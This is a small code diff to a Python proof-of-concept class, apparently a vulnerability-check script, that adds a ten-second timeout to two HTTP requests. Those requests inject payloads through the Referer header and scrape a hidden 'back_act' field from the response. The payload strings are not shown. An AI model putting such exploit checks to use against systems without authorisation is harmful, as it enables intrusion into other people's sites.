@@ -95,7 +95,7 @@ class DemoPOC(POCBase):
         for payload, version in payloads:
             headers = {'Referer': payload}
             try:
-                rr = requests.get(url, headers=headers)
+                rr = requests.get(url, headers=headers, timeout=10)
                 if flagText in rr.text:
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = self.url
@@ -148,7 +148,7 @@ class DemoPOC(POCBase):
 
         for payload in payloads:
             headers = {'Referer': payload[0]}
-            resp = requests.get(url, headers=headers)
+            resp = requests.get(url, headers=headers, timeout=10)
             r = get_middle_text(resp.text, '''<input type="hidden" name="back_act" value="''', "\n<br />")
             if r:
                 return r
